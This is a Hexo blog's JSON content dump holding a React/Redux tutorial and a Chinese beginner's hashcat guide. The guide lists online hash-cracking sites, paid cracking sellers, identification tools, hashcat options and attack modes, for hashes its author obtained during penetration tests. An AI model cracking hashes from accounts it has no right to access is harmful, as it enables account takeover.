{"meta":{"title":"To change is to be better to change often is to change perfect","subtitle":null,"description":"JoeJoeyMA Blog","author":null,"url":"http://yoursite.com"},"pages":[{"title":"","date":"2018-02-23T06:04:43.030Z","updated":"2018-02-23T06:04:43.030Z","comments":true,"path":"404.html","permalink":"http://yoursite.com/404.html","excerpt":"","text":"404页面 *{margin:0;padding:0;outline:none;font-family:\\5FAE\\8F6F\\96C5\\9ED1,宋体;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;-khtml-user-select:none;user-select:none;cursor:default;font-weight:lighter;} .center{margin:0 auto;} .whole{width:100%;height:100%;line-height:100%;position:fixed;bottom:0;left:0;z-index:-1000;overflow:hidden;} .whole img{width:100%;height:100%;} .mask{width:100%;height:100%;position:absolute;top:0;left:0;background:#000;opacity:0.6;filter:alpha(opacity=60);} .b{width:100%;text-align:center;height:400px;position:absolute;top:50%;margin-top:-230px}.a{width:150px;height:50px;margin-top:30px}.a a{display:block;float:left;width:150px;height:50px;background:#fff;text-align:center;line-height:50px;font-size:18px;border-radius:25px;color:#333}.a a:hover{color:#000;box-shadow:#fff 0 0 20px} p{color:#fff;margin-top:40px;font-size:24px;} #num{margin:0 5px;font-weight:bold;} var num=4; function redirect(){ num--; document.getElementById(\"num\").innerHTML=num; if(num 暂时未能找到您查找的页面 可能输入的网址错误或此页面不存在 秒后自动跳转到主页"},{"title":"about","date":"2018-02-21T15:42:31.000Z","updated":"2018-03-22T10:25:30.106Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":""},{"title":"book","date":"2018-02-21T15:43:32.000Z","updated":"2018-02-21T15:43:32.738Z","comments":true,"path":"book/index.html","permalink":"http://yoursite.com/book/index.html","excerpt":"","text":""},{"title":"","date":"2018-02-12T13:32:12.000Z","updated":"2018-02-21T15:33:47.666Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""},{"title":"","date":"2018-02-22T04:03:56.192Z","updated":"2018-02-22T04:03:56.192Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"JoejoeyMA blogA fashional newspaper, blog theme for Hexo. ☞ Preview Demo | 查看中文使用文档","text":"JoejoeyMA blogA fashional newspaper, blog theme for Hexo. ☞ Preview Demo | 查看中文使用文档 Installation Get it from GitHub 1$ git clone https://github.com/JoeJoeyMa/JoeJoeyMa.github.io themes/JoeJoeyMa Enable Modify theme setting in _config.yml to JoeJoeyMa. 1234# Extensions## Plugins: http://hexo.io/plugins/## Themes: http://hexo.io/themes/theme: hipaper Update 12$ cd themes/JoeJoeyMa$ git pull FeaturesLogo: Image or TextYou can set a image as your logo instead of original text title. Like this: just enable avatar field in hipaper/_config.yml. 12345678# Put your avatar.jpg into `hexo-site/themes/hipaper/source/` directory.# url is target link (E.g. `url: https://hexo.io/logo.svg` or `url: css/images/mylogo.jpg`)avatar: enable: true width: 124 height: 124 bottom: 10 url: https://hexo.io/logo.svg Code HighlightHipaper use Tomorrow Theme for your code block. We have six options in total: default, normal, night, night blue, night bright, night eighties Above preview picture is default theme. the image below show other five Highlight themes. Modify highlight_theme in JoeJoeyMa/_config.yml. 12345# Code Highlight theme# Available value:# default | normal | night | night eighties | night blue | night bright# https://github.com/chriskempson/tomorrow-themehighlight_theme: default SidebarYou can put your sidebar in left side, right side or bottom of your site by editing sidebar setting.Hipaper provides 7 built-in widgets: search social recent_posts category tag tagcloud archive All of them are enabled by default. You can edit them in widget setting. SearchHipaper use Insight Search to help you search anything inside your site without any third-party plugin. 12345# Searchsearch: insight: true # you need to install `hexo-generator-json-content` before using Insight Search swiftype: # enter swiftype install key here baidu: false # you need to disable other search engines to use Baidu search, options: true, false Attention: You need to install hexo-generator-json-content before using Insight Search. 1$ npm install -S hexo-generator-json-content FancyboxHipaper uses [Fancybox] to showcase your photos. You can use Markdown syntax or fancybox tag plugin to add your photos. 123![img caption](img url)&#123;% fancybox img_url [img_thumbnail] [img_caption] %&#125; Comment supportHipaper has native support for DuoShuo &amp; Disqus comment systems. Modify the following snippets to Hipaper JoeJoeyMa/_config.yml: 123# comment ShortName, you can choose only ONE to display.duoshuo_shortname: iTimeTravelerdisqus_shortname: Browser support ContributingAll kinds of contributions (enhancements, new features, documentation &amp; code improvements, issues &amp; bugs reporting) are welcome. Looking forward to your pull request. LicenseHipaper is under the MIT license. See the LICENSE file for details."}],"posts":[{"title":"react + redux + webpack + react-router + ES6/7/8 + immutable","slug":"react + redux + webpack + react-router + ES678 + immutable","date":"2018-06-18T13:26:00.000Z","updated":"2018-06-18T13:29:08.262Z","comments":true,"path":"2018/06/18/react + redux + webpack + react-router + ES678 + immutable/","link":"","permalink":"http://yoursite.com/2018/06/18/react + redux + webpack + react-router + ES678 + immutable/","excerpt":"","text":"技术栈： react + redux + webpack + react-router + ES6/7/8 + immutable 运行项目（nodejs 6.0+）123456789git clone cd react-pxqnpm i npm startnpm run build （发布） 说明 本项目主要用于理解 react 和 redux 的编译方式，以及 react + redux 之间的配合方式 如果觉得不错的话，您可以点右上角 “Star” 支持一下 谢谢！ ^_^ 或者您可以 “follow” 一下，我会不断开源更多的有趣的项目 如有问题请直接在 Issues 中提，或者您发现问题并有非常好的解决方案，欢迎 PR 👍 开发环境 macOS 10.13.1 Chrome 63 nodejs 8.9.1 推荐一个 vue2 + vuex 构建的 45 个页面的大型开源项目。地址在这里 另外一个 vue2 + vuex 的简单项目，非常适合入门练习。地址在这里 演示查看演示效果（请用chrome的手机模式预览） 移动端扫描下方二维码 个人感悟做React需要会什么？react的功能其实很单一，主要负责渲染的功能，现有的框架，比如angular是一个大而全的框架，用了angular几乎就不需要用其他工具辅助配合，但是react不一样，他只负责ui渲染，想要做好一个项目，往往需要其他库和工具的配合，比如用redux来管理数据，react-router管理路由，react已经全面拥抱es6，所以es6也得掌握，webpack就算是不会配置也要会用，要想提高性能，需要按需加载，immutable.js也得用上，还有单元测试。。。。 React 是什么用脚本进行DOM操作的代价很昂贵。有个贴切的比喻，把DOM和JavaScript各自想象为一个岛屿，它们之间用收费桥梁连接，js每次访问DOM，都要途径这座桥，并交纳“过桥费”,访问DOM的次数越多，费用也就越高。 因此，推荐的做法是尽量减少过桥的次数，努力待在ECMAScript岛上。因为这个原因react的虚拟dom就显得难能可贵了，它创造了虚拟dom并且将它们储存起来，每当状态发生变化的时候就会创造新的虚拟节点和以前的进行对比，让变化的部分进行渲染。整个过程没有对dom进行获取和操作，只有一个渲染的过程，所以react说是一个ui框架。 React的组件化react的一个组件很明显的由dom视图和state数据组成，两个部分泾渭分明。state是数据中心，它的状态决定着视图的状态。这时候发现似乎和我们一直推崇的MVC开发模式有点区别，没了Controller控制器，那用户交互怎么处理，数据变化谁来管理？然而这并不是react所要关心的事情，它只负责ui的渲染。与其他框架监听数据动态改变dom不同，react采用setState来控制视图的更新。setState会自动调用render函数，触发视图的重新渲染，如果仅仅只是state数据的变化而没有调用setState，并不会触发更新。 组件就是拥有独立功能的视图模块，许多小的组件组成一个大的组件，整个页面就是由一个个组件组合而成。它的好处是利于重复利用和维护。 React的 Diff算法react的diff算法用在什么地方呢？当组件更新的时候，react会创建一个新的虚拟dom树并且会和之前储存的dom树进行比较，这个比较多过程就用到了diff算法，所以组件初始化的时候是用不到的。react提出了一种假设，相同的节点具有类似的结构，而不同的节点具有不同的结构。在这种假设之上进行逐层的比较，如果发现对应的节点是不同的，那就直接删除旧的节点以及它所包含的所有子节点然后替换成新的节点。如果是相同的节点，则只进行属性的更改。 对于列表的diff算法稍有不同，因为列表通常具有相同的结构，在对列表节点进行删除，插入，排序的时候，单个节点的整体操作远比一个个对比一个个替换要好得多，所以在创建列表的时候需要设置key值，这样react才能分清谁是谁。当然不写key值也可以，但这样通常会报出警告，通知我们加上key值以提高react的性能。 React组件是怎么来的组件的创造方法为React.createClass() ——创造一个类，react系统内部设计了一套类系统，利用它来创造react组件。但这并不是必须的，我们还可以用es6的class类来创造组件,这也是Facebook官方推荐的写法。 这两种写法实现的功能一样但是原理却是不同，es6的class类可以看作是构造函数的一个语法糖，可以把它当成构造函数来看，extends实现了类之间的继承 —— 定义一个类Main 继承React.Component所有的属性和方法，组件的生命周期函数就是从这来的。constructor是构造器，在实例化对象时调用，super调用了父类的constructor创造了父类的实例对象this，然后用子类的构造函数进行修改。这和es5的原型继承是不同的，原型继承是先创造一个实例化对象this，然后再继承父级的原型方法。了解了这些之后我们在看组件的时候就清楚很多。 当我们使用组件&lt; Main /&gt;时，其实是对Main类的实例化——new Main，只不过react对这个过程进行了封装，让它看起来更像是一个标签。 有三点值得注意：1、定义类名字的首字母必须大写 2、因为class变成了关键字，类选择器需要用className来代替。 3、类和模块内部默认使用严格模式，所以不需要用use strict指定运行模式。 组件的生命周期 组件在初始化时会触发5个钩子函数： 1、getDefaultProps() 设置默认的props，也可以用dufaultProps设置组件的默认属性。 2、getInitialState() 在使用es6的class语法时是没有这个钩子函数的，可以直接在constructor中定义this.state。此时可以访问this.props。 3、componentWillMount() 组件初始化时只调用，以后组件更新不调用，整个生命周期只调用一次，此时可以修改state。 4、 render() react最重要的步骤，创建虚拟dom，进行diff算法，更新dom树都在此进行。此时就不能更改state了。 5、componentDidMount() 组件渲染之后调用，可以通过this.getDOMNode()获取和操作dom节点，只调用一次。 在更新时也会触发5个钩子函数： 6、componentWillReceivePorps(nextProps) 组件初始化时不调用，组件接受新的props时调用。 7、shouldComponentUpdate(nextProps, nextState) react性能优化非常重要的一环。组件接受新的state或者props时调用，我们可以设置在此对比前后两个props和state是否相同，如果相同则返回false阻止更新，因为相同的属性状态一定会生成相同的dom树，这样就不需要创造新的dom树和旧的dom树进行diff算法对比，节省大量性能，尤其是在dom结构复杂的时候。不过调用this.forceUpdate会跳过此步骤。 8、componentWillUpdate(nextProps, nextState) 组件初始化时不调用，只有在组件将要更新时才调用，此时可以修改state 9、render() 不多说 10、componentDidUpdate() 组件初始化时不调用，组件更新完成后调用，此时可以获取dom节点。 还有一个卸载钩子函数 11、componentWillUnmount() 组件将要卸载时调用，一些事件监听和定时器需要在此时清除。 以上可以看出来react总共有10个周期函数（render重复一次），这个10个函数可以满足我们所有对组件操作的需求，利用的好可以提高开发效率和组件性能。 React-Router路由Router就是React的一个组件，它并不会被渲染，只是一个创建内部路由规则的配置对象，根据匹配的路由地址展现相应的组件。Route则对路由地址和组件进行绑定，Route具有嵌套功能，表示路由地址的包涵关系，这和组件之间的嵌套并没有直接联系。Route可以向绑定的组件传递7个属性：children，history，location，params，route，routeParams，routes，每个属性都包涵路由的相关的信息。比较常用的有children（以路由的包涵关系为区分的组件），location（包括地址，参数，地址切换方式，key值，hash值）。react-router提供Link标签，这只是对a标签的封装，值得注意的是，点击链接进行的跳转并不是默认的方式，react-router阻止了a标签的默认行为并用pushState进行hash值的转变。切换页面的过程是在点击Link标签或者后退前进按钮时，会先发生url地址的转变，Router监听到地址的改变根据Route的path属性匹配到对应的组件，将state值改成对应的组件并调用setState触发render函数重新渲染dom。 当页面比较多时，项目就会变得越来越大，尤其对于单页面应用来说，初次渲染的速度就会很慢，这时候就需要按需加载，只有切换到页面的时候才去加载对应的js文件。react配合webpack进行按需加载的方法很简单，Route的component改为getComponent，组件用require.ensure的方式获取，并在webpack中配置chunkFilename。 1234567891011121314151617181920212223242526272829const chooseProducts = (location, cb) =&gt; &#123; require.ensure([], require =&gt; &#123; cb(null, require('../Component/chooseProducts').default) &#125;,'chooseProducts')&#125;const helpCenter = (location, cb) =&gt; &#123; require.ensure([], require =&gt; &#123; cb(null, require('../Component/helpCenter').default) &#125;,'helpCenter')&#125;const saleRecord = (location, cb) =&gt; &#123; require.ensure([], require =&gt; &#123; cb(null, require('../Component/saleRecord').default) &#125;,'saleRecord')&#125;const RouteConfig = ( &lt;Router history=&#123;history&#125;&gt; &lt;Route path=\"/\" component=&#123;Roots&#125;&gt; &lt;IndexRoute component=&#123;index&#125; /&gt;//首页 &lt;Route path=\"index\" component=&#123;index&#125; /&gt; &lt;Route path=\"helpCenter\" getComponent=&#123;helpCenter&#125; /&gt;//帮助中心 &lt;Route path=\"saleRecord\" getComponent=&#123;saleRecord&#125; /&gt;//销售记录 &lt;Redirect from='*' to='/' /&gt; &lt;/Route&gt; &lt;/Router&gt;); 组件之间的通信react推崇的是单向数据流，自上而下进行数据的传递，但是由下而上或者不在一条数据流上的组件之间的通信就会变的复杂。解决通信问题的方法很多，如果只是父子级关系，父级可以将一个回调函数当作属性传递给子级，子级可以直接调用函数从而和父级通信。 组件层级嵌套到比较深，可以使用上下文getChildContext来传递信息，这样在不需要将函数一层层往下传，任何一层的子级都可以通过this.context直接访问。 兄弟关系的组件之间无法直接通信，它们只能利用同一层的上级作为中转站。而如果兄弟组件都是最高层的组件，为了能够让它们进行通信，必须在它们外层再套一层组件，这个外层的组件起着保存数据，传递信息的作用，这其实就是redux所做的事情。 组件之间的信息还可以通过全局事件来传递。不同页面可以通过参数传递数据，下个页面可以用location.param来获取。其实react本身很简单，难的在于如何优雅高效的实现组件之间数据的交流。 Redux首先，redux并不是必须的，它的作用相当于在顶层组件之上又加了一个组件，作用是进行逻辑运算、储存数据和实现组件尤其是顶层组件的通信。如果组件之间的交流不多，逻辑不复杂，只是单纯的进行视图的渲染，这时候用回调，context就行，没必要用redux，用了反而影响开发速度。但是如果组件交流特别频繁，逻辑很复杂，那redux的优势就特别明显了。我第一次做react项目的时候并没有用redux，所有的逻辑都是在组件内部实现，当时为了实现一个逻辑比较复杂的购物车，洋洋洒洒居然写了800多行代码，回头一看我自己都不知道写的是啥，画面太感人。 先简单说一下redux和react是怎么配合的。react-redux提供了connect和Provider两个好基友，它们一个将组件与redux关联起来，一个将store传给组件。组件通过dispatch发出action，store根据action的type属性调用对应的reducer并传入state和这个action，reducer对state进行处理并返回一个新的state放入store，connect监听到store发生变化，调用setState更新组件，此时组件的props也就跟着变化。 流程是这个样子的： 值得注意的是connect，Provider，mapStateToProps,mapDispatchToProps是react-redux提供的，redux本身和react没有半毛钱关系，它只是数据处理中心，没有和react产生任何耦合，是react-redux让它们联系在一起。 接下来具体分析一下，redux以及react-redux到底是怎么实现的。先上一张图 明显比第一张要复杂，其实两张图说的是同一件事。从上而下慢慢分析： 先说说redux：redux主要由三部分组成：store，reducer，action。store是一个对象，它有四个主要的方法： 1、dispatch: 用于action的分发——在createStore中可以用middleware中间件对dispatch进行改造，比如当action传入dispatch会立即触发reducer，有些时候我们不希望它立即触发，而是等待异步操作完成之后再触发，这时候用redux-thunk对dispatch进行改造，以前只能传入一个对象，改造完成后可以传入一个函数，在这个函数里我们手动dispatch一个action对象，这个过程是可控的，就实现了异步。 2、subscribe： 监听state的变化——这个函数在store调用dispatch时会注册一个listener监听state变化，当我们需要知道state是否变化时可以调用，它返回一个函数，调用这个返回的函数可以注销监听。let unsubscribe = store.subscribe(() =&gt; {console.log(‘state发生了变化’)}) 3、getState： 获取store中的state——当我们用action触发reducer改变了state时，需要再拿到新的state里的数据，毕竟数据才是我们想要的。getState主要在两个地方需要用到，一是在dispatch拿到action后store需要用它来获取state里的数据，并把这个数据传给reducer，这个过程是自动执行的，二是在我们利用subscribe监听到state发生变化后调用它来获取新的state数据，如果做到这一步，说明我们已经成功了。 4、replaceReducer: 替换reducer，改变state修改的逻辑。 store可以通过createStore()方法创建，接受三个参数，经过combineReducers合并的reducer和state的初始状态以及改变dispatch的中间件，后两个参数并不是必须的。store的主要作用是将action和reducer联系起来并改变state。 action: action是一个对象，其中type属性是必须的，同时可以传入一些数据。action可以用actionCreactor进行创造。dispatch就是把action对象发送出去。 reducer: reducer是一个函数，它接受一个state和一个action，根据action的type返回一个新的state。根据业务逻辑可以分为很多个reducer，然后通过combineReducers将它们合并，state树中有很多对象，每个state对象对应一个reducer，state对象的名字可以在合并时定义。 像这个样子：12345const reducer = combineReducers(&#123; a: doSomethingWithA, b: processB, c: c&#125;) combineReducers: 其实它也是一个reducer，它接受整个state和一个action，然后将整个state拆分发送给对应的reducer进行处理，所有的reducer会收到相同的action，不过它们会根据action的type进行判断，有这个type就进行处理然后返回新的state，没有就返回默认值，然后这些分散的state又会整合在一起返回一个新的state树。 接下来分析一下整体的流程，首先调用store.dispatch将action作为参数传入，同时用getState获取当前的状态树state并注册subscribe的listener监听state变化，再调用combineReducers并将获取的state和action传入。combineReducers会将传入的state和action传给所有reducer，并根据action的type返回新的state，触发state树的更新，我们调用subscribe监听到state发生变化后用getState获取新的state数据。 redux的state和react的state两者完全没有关系，除了名字一样。 上面分析了redux的主要功能，那么react-redux到底做了什么？ React-Redux如果只使用redux，那么流程是这样的： component –&gt; dispatch(action) –&gt; reducer –&gt; subscribe –&gt; getState –&gt; component 用了react-redux之后流程是这样的： component –&gt; actionCreator(data) –&gt; reducer –&gt; component store的三大功能：dispatch，subscribe，getState都不需要手动来写了。react-redux帮我们做了这些，同时它提供了两个好基友Provider和connect。 Provider是一个组件，它接受store作为props，然后通过context往下传，这样react中任何组件都可以通过context获取store。也就意味着我们可以在任何一个组件里利用dispatch(action)来触发reducer改变state，并用subscribe监听state的变化，然后用getState获取变化后的值。但是并不推荐这样做，它会让数据流变的混乱，过度的耦合也会影响组件的复用，维护起来也更麻烦。 connect –connect(mapStateToProps, mapDispatchToProps, mergeProps, options) 是一个函数，它接受四个参数并且再返回一个函数–wrapWithConnect，wrapWithConnect接受一个组件作为参数wrapWithConnect(component)，它内部定义一个新组件Connect(容器组件)并将传入的组件(ui组件)作为Connect的子组件然后return出去。 所以它的完整写法是这样的：connect(mapStateToProps, mapDispatchToProps, mergeProps, options)(component) mapStateToProps(state, [ownProps])： mapStateToProps 接受两个参数，store的state和自定义的props，并返回一个新的对象，这个对象会作为props的一部分传入ui组件。我们可以根据组件所需要的数据自定义返回一个对象。ownProps的变化也会触发mapStateToProps 123function mapStateToProps(state) &#123; return &#123; todos: state.todos &#125;;&#125; mapDispatchToProps(dispatch, [ownProps])： mapDispatchToProps如果是对象，那么会和store绑定作为props的一部分传入ui组件。如果是个函数，它接受两个参数，bindActionCreators会将action和dispatch绑定并返回一个对象，这个对象会和ownProps一起作为props的一部分传入ui组件。所以不论mapDispatchToProps是对象还是函数，它最终都会返回一个对象，如果是函数，这个对象的key值是可以自定义的 123456function mapDispatchToProps(dispatch) &#123; return &#123; todoActions: bindActionCreators(todoActionCreators, dispatch), counterActions: bindActionCreators(counterActionCreators, dispatch) &#125;;&#125; mapDispatchToProps返回的对象其属性其实就是一个个actionCreator，因为已经和dispatch绑定，所以当调用actionCreator时会立即发送action，而不用手动dispatch。ownProps的变化也会触发mapDispatchToProps。 mergeProps(stateProps, dispatchProps, ownProps)： 将mapStateToProps() 与 mapDispatchToProps()返回的对象和组件自身的props合并成新的props并传入组件。默认返回 Object.assign({}, ownProps, stateProps, dispatchProps) 的结果。 options： pure = true 表示Connect容器组件将在shouldComponentUpdate中对store的state和ownProps进行浅对比，判断是否发生变化，优化性能。为false则不对比。 其实connect函数并没有做什么，大部分的逻辑都是在它返回的wrapWithConnect函数内实现的，确切的说是在wrapWithConnect内定义的Connect组件里实现的。 下面是一个完整的 react –&gt; redux –&gt; react 流程：一、Provider组件接受redux的store作为props，然后通过context往下传。 二、connect函数在初始化的时候会将mapDispatchToProps对象绑定到store，如果mapDispatchToProps是函数则在Connect组件获得store后，根据传入的store.dispatch和action通过bindActionCreators进行绑定，再将返回的对象绑定到store，connect函数会返回一个wrapWithConnect函数，同时wrapWithConnect会被调用且传入一个ui组件，wrapWithConnect内部使用class Connect extends Component定义了一个Connect组件，传入的ui组件就是Connect的子组件，然后Connect组件会通过context获得store，并通过store.getState获得完整的state对象，将state传入mapStateToProps返回stateProps对象、mapDispatchToProps对象或mapDispatchToProps函数会返回一个dispatchProps对象，stateProps、dispatchProps以及Connect组件的props三者通过Object.assign()，或者mergeProps合并为props传入ui组件。然后在ComponentDidMount中调用store.subscribe，注册了一个回调函数handleChange监听state的变化。 三、此时ui组件就可以在props中找到actionCreator，当我们调用actionCreator时会自动调用dispatch，在dispatch中会调用getState获取整个state，同时注册一个listener监听state的变化，store将获得的state和action传给combineReducers，combineReducers会将state依据state的key值分别传给子reducer，并将action传给全部子reducer，reducer会被依次执行进行action.type的判断，如果有则返回一个新的state，如果没有则返回默认。combineReducers再次将子reducer返回的单个state进行合并成一个新的完整的state。此时state发生了变化。dispatch在state返回新的值之后会调用所有注册的listener函数其中包括handleChange函数，handleChange函数内部首先调用getState获取新的state值并对新旧两个state进行浅对比，如果相同直接return，如果不同则调用mapStateToProps获取stateProps并将新旧两个stateProps进行浅对比，如果相同，直接return结束，不进行后续操作。如果不相同则调用this.setState()触发Connect组件的更新，传入ui组件，触发ui组件的更新，此时ui组件获得新的props，react –&gt; redux –&gt; react 的一次流程结束。 上面的有点复杂，简化版的流程是： 一、Provider组件接受redux的store作为props，然后通过context往下传。 二、connect函数收到Provider传出的store，然后接受三个参数mapStateToProps，mapDispatchToProps和组件，并将state和actionCreator以props传入组件，这时组件就可以调用actionCreator函数来触发reducer函数返回新的state，connect监听到state变化调用setState更新组件并将新的state传入组件。 connect可以写的非常简洁，mapStateToProps，mapDispatchToProps只不过是传入的回调函数，connect函数在必要的时候会调用它们，名字不是固定的，甚至可以不写名字。 简化版本：1connect(state =&gt; state, action)(Component); 项目搭建上面说了react，react-router和redux的知识点。但是怎么样将它们整合起来，搭建一个完整的项目。 1、先引用 react.js，redux，react-router 等基本文件，建议用npm安装，直接在文件中引用。 2、从 react.js，redux，react-router 中引入所需要的对象和方法。12345import React, &#123;Component, PropTypes&#125; from 'react';import ReactDOM, &#123;render&#125; from 'react-dom';import &#123;Provider, connect&#125; from 'react-redux';import &#123;createStore, combineReducers, applyMiddleware&#125; from 'redux';import &#123; Router, Route, Redirect, IndexRoute, browserHistory, hashHistory &#125; from 'react-router'; 3、根据需求创建顶层ui组件，每个顶层ui组件对应一个页面。 4、创建actionCreators和reducers，并用combineReducers将所有的reducer合并成一个大的reduer。利用createStore创建store并引入combineReducers和applyMiddleware。 5、利用connect将actionCreator，reuder和顶层的ui组件进行关联并返回一个新的组件。 6、利用connect返回的新的组件配合react-router进行路由的部署，返回一个路由组件Router。 7、将Router放入最顶层组件Provider，引入store作为Provider的属性。 8、调用render渲染Provider组件且放入页面的标签中。 可以看到顶层的ui组件其实被套了四层组件，Provider，Router，Route，Connect，这四个组件并不会在视图上改变react，它们只是功能性的。 通常我们在顶层的ui组件打印props时可以看到一堆属性： 上图的顶层ui组件属性总共有18个，如果刚刚接触react，可能对这些属性怎么来的感到困惑，其实这些属性来自五个地方： 组件自定义属性1个，actionCreator返回的对象6个，reducer返回的state4个，Connect组件属性0个，以及Router注入的属性7个。","categories":[],"tags":[{"name":"react","slug":"react","permalink":"http://yoursite.com/tags/react/"},{"name":"Redux","slug":"Redux","permalink":"http://yoursite.com/tags/Redux/"},{"name":"webpack","slug":"webpack","permalink":"http://yoursite.com/tags/webpack/"},{"name":"react-router","slug":"react-router","permalink":"http://yoursite.com/tags/react-router/"},{"name":"ES6/7/8","slug":"ES6-7-8","permalink":"http://yoursite.com/tags/ES6-7-8/"},{"name":"immutable","slug":"immutable","permalink":"http://yoursite.com/tags/immutable/"}]},{"title":"快速破解各种散列hash [ hashcat入门篇 ]","slug":"快速破解各种散列hash [ hashcat入门篇 ]","date":"2018-04-24T04:43:05.000Z","updated":"2018-04-24T04:52:52.542Z","comments":true,"path":"2018/04/24/快速破解各种散列hash [ hashcat入门篇 ]/","link":"","permalink":"http://yoursite.com/2018/04/24/快速破解各种散列hash [ hashcat入门篇 ]/","excerpt":"","text":"Hase MD5 爆破 0x00 前言 最近恰巧刚搞到一批hash,所以就寻思着,要不顺手小结一点关于hash破解的东西吧,反正经常要用,就当留备忘了,顺便也分享给大家,主要还是希望大家都能在实际渗透中能尽快上手用,既是这样,就肯定不会涉及太深,比如,其内部的破解算法具体是如何实现的等…,我们都不会去深入剖析,毕竟,并不是为了去写此类工具,如果真的有兴趣,可自行去读源码[ 起码自己暂时还没那能力 ],经常渗透的朋友可能都非常清楚,由于各种各样的途径,我们经常会搞到各种各样的散列[ hash ],比如,各类web管理用户的密码hash,各类系统用户的密码hash,各种第三方服务器工具配置文件中的hash,各类办公套件文件启动密码的加密hash,等…今天,我们就来简要说明一下关于各类hash破解工具的使用,以备不时之需…其实,明眼人都很清楚,hash破解本质是没啥实际技术含量的[ 前提你自己不写此类工具 ],还是那句话,主要目的还是希望大家能尽快上手,既然是好东西就要想办法把它应用到实际干活儿中,不然,意义何在呢…废话少说,咱们开始介绍今天的第一款hash破解工具,hashcat想必该工具早已家喻户晓[ 关于hash破解的东西,后续我会做成一个单独的系列 ],希望大家能持续关注,你们的支持,会是自己努力创作的源泉,嘿嘿… 0x01 先介绍几个相对比较好用的在线hash破解站,其实,诸如此类的站点非常多,不过大多都不太靠谱,后期遇到好的我会再贴上来 算是国内比较知名的在线hash破解站,虽然目前支持的散列类型还比较少,不过就成功率来讲,还行吧,在你自己没有特别好的显卡,GPU矩阵或者性能强劲的CPU的时候,它无疑是个很好的替代品,实在没查到,起码还可以在后台帮你跑五天,先不管能不能跑出来,总归是个希望 1cmd5.com如果cmd5实在跑不出来,不妨再尝试它,也是个比较老的在线hash破解站了,估计朋友们也都比较熟悉,这里就不啰嗦了 1www.objectif-securite.ch另外,在淘宝上也有很多提供这种hash爆破服务的卖家,实在不行还可以尝试直接丢给他们跑,一般跑出来才会让你付钱,其实说白点儿,他们可能也是在后台拿GPU矩阵跑的,需要注意的是,找个靠谱点儿的店就好了,某宝骗子多,形形色色,有些东西总让人防不胜防 1淘宝最后,在kali中也自带了一个在线的hash破解脚本findmyhash,其实,脚本做的事情非常low,就是轮询着把你提供的hash丢到各个hash破解站上去查询,如果查到了就把对应的结果明文发回来,实在不行,还可以丢到谷歌上跑跑,仅此而已,可能唯一要注意的是先把kali挂上vpn,不然,有些站点可能访问不了,说实话,基本就是个废除了最普通的md5,别的就算了吧,实在没办法,碰碰运气还是可以的 1 findmyhash md5 -h ff9830c42660c1dd1942844f8069b74a 0x02 识别hash类型 如果你实在搞不清楚某条hash的具体散列类型,不妨先用下面的脚本[kali自带]大致识别下,可能不太准,不过粗略的看一眼还是可以的,另外,谷歌上也有很多在线的hash类型识别站,可自行去尝试,这里就不一一列举了hash-identifier.png 1 hash-identifier0x03 使用hashcat前的一点点准备工作 务必保证已经事先装好对应的显卡驱动看官网这情况,最新版的hashcat除了增加了一些新的散列类型之外,貌似也已经不再区分AMD和英伟达显卡了,如果你用的是旧版本的hashcat,请根据自己实际的显卡类型来选择对应版本的hashcat,之后再到其官方站点把hashcat down下来,注意,直接解压即可运行,无需再额外装任何东西,用什么系统就运行对应系统的可执行程序即可实际破解中,更推荐用linux,可能就是装驱动稍微有点儿麻烦,不过还好啦,如果实在搞不定,在win下跑也是一样的,本来想用显卡给大家演示的,没办法,家里的电脑,集成显卡没钱,无奈,大家谅解哈,所以,下面就直接全部用kali自带的hashcat来演示了,不同类型的hashcat,单就用法来讲,其实也没啥太大区别,实际使用中建议还是自己买块好点儿的显卡跑,如果真有条件很显然,本人是个穷逼GPU矩阵也是可以考虑的 1https://hashcat.net/files/hashcat-3.6.0.7z0x04 关于hashcat的一些常用选项 如果在kali中提示要升级到新版本[kali2.x可能会出现这样的情况],请把系统时间修改到2010年之前即可,这里就只说几个最常用的选项,关于其它的各种小选项,因为自己实际中用的比较少,如果大家万一用到,扫一眼帮助即可,篇幅原因这里就只捡最核心的说了 123456789101112-a 指定要使用的破解模式-m 指定要破解的hash类型所对应的id[下面有一份完整的hash id对照表],几乎现在市面上常用的一些散列类型它都支持,而且每个版本更新都会增加一些新的算法-o 指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中–force 忽略破解过程中的警告信息,跑单条hash可能需要加上此选项–show 显示已经破解的hash及该hash所对应的明文–increment 启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程,其实,并不建议这么用,因为破解时间可能会比较长–increment-min 密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用–increment-max 密码最大长度,同上–outfile-format 指定破解结果的输出格式id,一般自己常用3–username 忽略hash文件中的指定的用户名,在破解win和linux系统用户密码hash可能会用到–remove 删除已被破解成功的hash-r 使用自定义破解规则,这个后期抽空再说吧,比较的复杂,不是一两句话能说完的0x05 hashcat 不同破解模式下的具体工作细节: 最简单的纯粹基于字典的爆破模式,后面可以连续跟上多个字典文件,破解的成功与否最终还是取决于字典质量,在几乎同等的破解时间里,是我我肯定不会先选它的,简单跑一些弱口令什么的,还是可以的,话说回来,如果只是跑些弱口令,大可不用hashcat,未免有些大材小用了,不是吗 10 | Straight一种相对智能高效的爆破模式,它的意思是这样的,如果你事先已经明确知道密码中可能包含哪些字符串,你可以把那些字符串事先写到文件中,每行对应一个字符串,然后hashcat会自动根据你所提供的这些字符串,尝试所有可能的组合进行猜解 11 | Combination基于纯掩码的爆破方式,如果你有需求要大批量爆破hash,可能会用到,后面我们会用绝大部分的篇幅来说它,这里需要稍微注意下,你给定的掩码是多少位它就只破解多少位,比如,你给的是7位的掩码,它就只跑7位这么长,它可能并不是你想象的那样,是从1位一直跑到第7位这样自动轮询,如果你想让它自动变长跑,启用increment模式指定密码的最小和最大长度即可,之前理解的有点儿错,也是看官方的wiki才知道的,汗… 13 | Brute-force基于字典和掩码配合的爆破模式,它的破解过程其实也比较简单,就是每次从前面的字典中取出一个字符串然后和后面掩码的所有组合进行拼接,直到撞到对应的明文 16 | Hybrid Wordlist + Mask基于掩码和字典配合的爆破模式,跟6的过程正好相反,只不过这次它是从前面进行拼接 17 | Hybrid Mask + Wordlist0x06 hashcat 不同的掩码所表示的具体字符及掩码字符集规则使用样例: 